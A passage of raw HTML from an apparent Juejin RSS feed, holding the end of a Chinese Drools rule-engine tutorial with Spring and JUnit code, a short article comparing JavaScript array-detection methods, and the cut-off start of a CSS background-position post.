
<span class="hljs-keyword">import</span> org.drools.decisiontable.InputType;
<span class="hljs-keyword">import</span> org.drools.decisiontable.SpreadsheetCompiler;
<span class="hljs-keyword">import</span> org.kie.api.KieServices;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieBuilder;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieFileSystem;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieModule;
<span class="hljs-keyword">import</span> org.kie.api.io.ResourceType;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.internal.io.ResourceFactory;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-keyword">import</span> java.io.InputStream;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecisionTableConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KieContainer <span class="hljs-title function_">decisionTableContainer</span><span class="hljs-params">()</span> {
        <span class="hljs-type">KieServices</span> <span class="hljs-variable">kieServices</span> <span class="hljs-operator">=</span> KieServices.Factory.get();
        <span class="hljs-type">KieFileSystem</span> <span class="hljs-variable">kieFileSystem</span> <span class="hljs-operator">=</span> kieServices.newKieFileSystem();

        <span class="hljs-comment">// 编译Excel决策表</span>
        <span class="hljs-type">InputStream</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> getClass()
                .getResourceAsStream(<span class="hljs-string">"/decision-tables/discount-table.xls"</span>);

        <span class="hljs-type">SpreadsheetCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpreadsheetCompiler</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">drl</span> <span class="hljs-operator">=</span> compiler.compile(template, InputType.XLS);

        kieFileSystem.write(<span class="hljs-string">"src/main/resources/discount-table.drl"</span>, drl);

        <span class="hljs-type">KieBuilder</span> <span class="hljs-variable">kieBuilder</span> <span class="hljs-operator">=</span> kieServices.newKieBuilder(kieFileSystem);
        kieBuilder.buildAll();

        <span class="hljs-type">KieModule</span> <span class="hljs-variable">kieModule</span> <span class="hljs-operator">=</span> kieBuilder.getKieModule();
        <span class="hljs-keyword">return</span> kieServices.newKieContainer(kieModule.getReleaseId());
    }
}
</code></pre>
<h3 data-id="heading-28">九、监控与调试</h3>
<h4 data-id="heading-29">9.1 规则执行监听器</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.listener;

<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.kie.api.event.rule.*;

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuleExecutionListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DefaultAgendaEventListener</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeMatchFired</span><span class="hljs-params">(BeforeMatchFiredEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.info(<span class="hljs-string">"准备执行规则: {}"</span>, ruleName);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterMatchFired</span><span class="hljs-params">(AfterMatchFiredEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.info(<span class="hljs-string">"规则执行完成: {}"</span>, ruleName);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">matchCreated</span><span class="hljs-params">(MatchCreatedEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.debug(<span class="hljs-string">"规则匹配成功: {}"</span>, ruleName);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">matchCancelled</span><span class="hljs-params">(MatchCancelledEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.debug(<span class="hljs-string">"规则匹配取消: {}"</span>, ruleName);
    }
}
</code></pre>
<h4 data-id="heading-30">9.2 使用监听器</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> com.example.drools.listener.RuleExecutionListener;
<span class="hljs-keyword">import</span> com.example.drools.model.Order;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MonitoredRuleService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KieContainer kieContainer;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MonitoredRuleService</span><span class="hljs-params">(KieContainer kieContainer)</span> {
        <span class="hljs-built_in">this</span>.kieContainer = kieContainer;
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">executeWithMonitoring</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 添加监听器</span>
            kieSession.addEventListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuleExecutionListener</span>());

            <span class="hljs-comment">// 执行规则</span>
            kieSession.insert(order);
            kieSession.fireAllRules();

            <span class="hljs-keyword">return</span> order;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }
}
</code></pre>
<h3 data-id="heading-31">十、性能优化</h3>
<h4 data-id="heading-32">10.1 规则优化建议</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 优化前 - 性能较差</span>
rule <span class="hljs-string">"Bad Performance Rule"</span>
    when
        $order: Order()
        $customer: Customer() from $order.customer
        $item: OrderItem() from $order.items
    then
        <span class="hljs-comment">// 复杂计算</span>
end

<span class="hljs-comment">// 优化后 - 性能更好</span>
rule <span class="hljs-string">"Good Performance Rule"</span>
    salience <span class="hljs-number">100</span>
    when
        $order: Order(
            customer.level == <span class="hljs-string">"VIP"</span>,
            totalAmount &gt; <span class="hljs-number">1000</span>
        )
    then
        <span class="hljs-comment">// 简化逻辑</span>
        $order.applyDiscount($order.getTotalAmount().multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.15"</span>)));
end
</code></pre>
<h4 data-id="heading-33">10.2 KieSession管理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> javax.annotation.PreDestroy;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentLinkedQueue;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KieSessionPool</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KieContainer kieContainer;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentLinkedQueue&lt;KieSession&gt; sessionPool;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">POOL_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">KieSessionPool</span><span class="hljs-params">(KieContainer kieContainer)</span> {
        <span class="hljs-built_in">this</span>.kieContainer = kieContainer;
        <span class="hljs-built_in">this</span>.sessionPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentLinkedQueue</span>&lt;&gt;();
        initializePool();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializePool</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; POOL_SIZE; i++) {
            sessionPool.offer(kieContainer.newKieSession());
        }
    }

    <span class="hljs-keyword">public</span> KieSession <span class="hljs-title function_">getSession</span><span class="hljs-params">()</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionPool.poll();
        <span class="hljs-keyword">if</span> (session == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> kieContainer.newKieSession();
        }
        <span class="hljs-keyword">return</span> session;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnSession</span><span class="hljs-params">(KieSession session)</span> {
        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
            session.dispose();
            sessionPool.offer(kieContainer.newKieSession());
        }
    }

    <span class="hljs-meta">@PreDestroy</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span> {
        sessionPool.forEach(KieSession::dispose);
    }
}
</code></pre>
<h3 data-id="heading-34">十一、测试用例</h3>
<h4 data-id="heading-35">11.1 单元测试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools;

<span class="hljs-keyword">import</span> com.example.drools.model.*;
<span class="hljs-keyword">import</span> com.example.drools.service.RuleService;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.BeforeEach;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDate;
<span class="hljs-keyword">import</span> java.util.Arrays;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.jupiter.api.Assertions.*;

<span class="hljs-meta">@SpringBootTest</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DroolsRuleTest</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RuleService ruleService;

    <span class="hljs-keyword">private</span> Order testOrder;
    <span class="hljs-keyword">private</span> Customer vipCustomer;

    <span class="hljs-meta">@BeforeEach</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUp</span><span class="hljs-params">()</span> {
        vipCustomer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">1L</span>, <span class="hljs-string">"测试VIP"</span>, <span class="hljs-string">"VIP"</span>, <span class="hljs-number">5000</span>,
                LocalDate.of(<span class="hljs-number">2020</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-literal">false</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">1L</span>, <span class="hljs-string">"测试商品"</span>, <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1000"</span>), <span class="hljs-literal">true</span>, <span class="hljs-number">100</span>
        );

        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(
                product, <span class="hljs-number">2</span>, product.getPrice(), BigDecimal.ZERO
        );
        item.calculateSubtotal();

        testOrder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        testOrder.setOrderId(<span class="hljs-number">1L</span>);
        testOrder.setCustomer(vipCustomer);
        testOrder.setItems(Arrays.asList(item));
        testOrder.calculateTotalAmount();
        testOrder.setFinalAmount(testOrder.getTotalAmount());
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testVipDiscount</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ruleService.applyDiscountRules(testOrder);

        assertTrue(result.getDiscountAmount().compareTo(BigDecimal.ZERO) &gt; <span class="hljs-number">0</span>,
                <span class="hljs-string">"VIP客户应该有折扣"</span>);
        assertTrue(result.getFinalAmount().compareTo(result.getTotalAmount()) &lt; <span class="hljs-number">0</span>,
                <span class="hljs-string">"最终金额应该小于原始金额"</span>);
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testLargeOrderDiscount</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Product</span> <span class="hljs-variable">expensiveProduct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">2L</span>, <span class="hljs-string">"昂贵商品"</span>, <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1500"</span>), <span class="hljs-literal">true</span>, <span class="hljs-number">50</span>
        );
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(
                expensiveProduct, <span class="hljs-number">1</span>, expensiveProduct.getPrice(), BigDecimal.ZERO
        );
        item.calculateSubtotal();

        testOrder.setItems(Arrays.asList(item));
        testOrder.calculateTotalAmount();

        <span class="hljs-type">Order</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ruleService.applyDiscountRules(testOrder);

        assertTrue(result.getDiscountAmount().compareTo(BigDecimal.ZERO) &gt; <span class="hljs-number">0</span>,
                <span class="hljs-string">"大额订单应该有折扣"</span>);
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testOrderValidation</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Product</span> <span class="hljs-variable">outOfStock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">3L</span>, <span class="hljs-string">"缺货商品"</span>, <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"500"</span>), <span class="hljs-literal">true</span>, <span class="hljs-number">0</span>
        );
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(outOfStock, <span class="hljs-number">1</span>, outOfStock.getPrice(), BigDecimal.ZERO);

        testOrder.setItems(Arrays.asList(item));

        List&lt;String&gt; errors = ruleService.validateOrder(testOrder);

        assertFalse(errors.isEmpty(), <span class="hljs-string">"应该有验证错误"</span>);
        assertTrue(errors.stream().anyMatch(e -&gt; e.contains(<span class="hljs-string">"库存"</span>)),
                <span class="hljs-string">"应该包含库存错误"</span>);
    }
}
</code></pre>
<h3 data-id="heading-36">十二、总结</h3>
<p>本文全面介绍了Drools规则引擎的实战应用：</p>
<ol>
<li><strong>核心架构</strong>：KieBase、KieSession、Agenda工作原理</li>
<li><strong>规则编写</strong>：DRL语法、条件匹配、动作执行</li>
<li><strong>Spring集成</strong>：配置管理、依赖注入</li>
<li><strong>实战场景</strong>：电商促销、订单折扣、库存验证</li>
<li><strong>高级特性</strong>：Decision Table、规则监听、性能优化</li>
<li><strong>最佳实践</strong>：规则设计、Session管理、测试策略</li>
</ol>
<p>Drools将业务规则与代码解耦，使规则更易维护和扩展，是企业级应用的理想选择。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[数组判断？我早不用instanceof了，现在一行代码搞定！]]></title>    <link>https://juejin.cn/post/7579849892614094884</link>    <guid>https://juejin.cn/post/7579849892614094884</guid>    <pubDate>2025-12-05T03:02:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579849892614094884" data-draft-id="7571846248718794752" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="数组判断？我早不用instanceof了，现在一行代码搞定！"/> <meta itemprop="keywords" content="JavaScript,前端"/> <meta itemprop="datePublished" content="2025-12-05T03:02:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南游"/> <meta itemprop="url" content="https://juejin.cn/user/1728872003943688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            数组判断？我早不用instanceof了，现在一行代码搞定！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1728872003943688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南游
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:02:33.000Z" title="Fri Dec 05 2025 03:02:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">传统方案</h3>
<h4 data-id="heading-1">1. Object.prototype.toString.call 方法</h4>
<p><strong>原理</strong>：通过调用 <code>Object.prototype.toString.call(obj)</code> ，判断返回值是否为  <code>[object Array]</code> 。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isArray</span>(<span class="hljs-params">obj</span>){
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) === <span class="hljs-string">'[object Array]'</span>;
}
</code></pre>
<p> 
<strong>缺陷</strong>：</p>
<ul>
<li>
<p>ES6 引入 <code>Symbol.toStringTag</code> 后，可被人为篡改。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]: <span class="hljs-string">'Array'</span>
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj)); <span class="hljs-comment">// 输出 [object Array]</span>
</code></pre>
</li>
<li>
<p>若开发通用型代码（如框架、库），该漏洞会导致判断失效。</p>
</li>
</ul>
<h4 data-id="heading-2">2. instanceof 方法</h4>
<p><strong>原理</strong>：判断对象原型链上是否存在 <code>Array</code> 构造函数。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isArray</span>(<span class="hljs-params">obj</span>){
  <span class="hljs-keyword">return</span> obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>;
}
</code></pre>
<p><strong>缺陷</strong>：</p>
<ul>
<li>
<p>可通过 <code>Object.setPrototypeOf</code> 篡改原型链，导致误判。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {};
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// 输出 true，但 obj 并非真正数组</span>
</code></pre>
</li>
<li>
<p>跨 iframe 场景失效。不同 iframe 中的 <code>Array</code> 构造函数不共享，导致真数组被误判为非数组。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> frame = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'iframe'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Array2</span> = frame.<span class="hljs-property">contentWindow</span>.<span class="hljs-property">Array</span>;
<span class="hljs-keyword">const</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array2</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// 输出 false，但 arr 是真正数组</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">ES6 原生方法</h3>
<p><strong>方法</strong>：使用 <code>Array.isArray</code> 静态方法。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(arr));
</code></pre>
<p> 
<strong>优势</strong>：</p>
<ul>
<li>
<p>该方法由JavaScript引擎内部实现，直接判断对象是否由 Array 构造函数创建，不受原型链、 Symbol.toStringTag  或跨 iframe 影响；</p>
</li>
<li>
<p>完美解决所有边界场景。</p>
</li>
</ul>
<h3 data-id="heading-4">总结</h3>
<p>判断数组的方法中 <code>Array.isArray</code> 是唯一准确且无缺陷的方案。其他方法（如<code>Object.prototype.toString.call</code>、<code>instanceof</code>）均存在局限性，仅在特定场景下可用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS属性：background-position]]></title>    <link>https://juejin.cn/post/7579849892614144036</link>    <guid>https://juejin.cn/post/7579849892614144036</guid>    <pubDate>2025-12-05T03:04:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579849892614144036" data-draft-id="7579846685071933494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS属性：background-position"/> <meta itemprop="keywords" content="CSS"/> <meta itemprop="datePublished" content="2025-12-05T03:04:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tj"/> <meta itemprop="url" content="https://juejin.cn/user/4218165277233182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS属性：background-position
